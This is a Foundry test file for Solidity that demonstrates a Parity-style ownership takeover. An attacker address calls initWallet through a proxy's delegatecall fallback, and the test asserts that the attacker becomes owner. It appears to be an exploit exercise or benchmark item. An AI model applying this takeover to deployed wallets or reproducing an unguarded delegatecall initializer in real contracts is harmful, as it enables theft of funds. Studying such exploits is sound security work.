// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contract.sol";

contract ExploitParityDelegatecallTest is Test {
    ParityDelegatecall wallet;
    WalletLibrary lib;
    address attacker = address(0xBEEF);

    function setUp() public {
        lib = new WalletLibrary();
        wallet = new ParityDelegatecall(address(lib));
    }

    function testExploit_OwnerTakeoverViaInitDelegatecall() public {
        // deterministic success condition:
        // attacker calls initWallet through fallback and becomes owner in proxy storage.
        vm.prank(attacker);
        (bool ok, ) = address(wallet).call(abi.encodeWithSignature("initWallet(address)", attacker));
        assertTrue(ok, "delegatecall path should be reachable");

        // NOTE: cast expected owner slot based on simplified storage layout.
        assertEq(wallet.owner(), attacker, "owner takeover must succeed");
    }
}
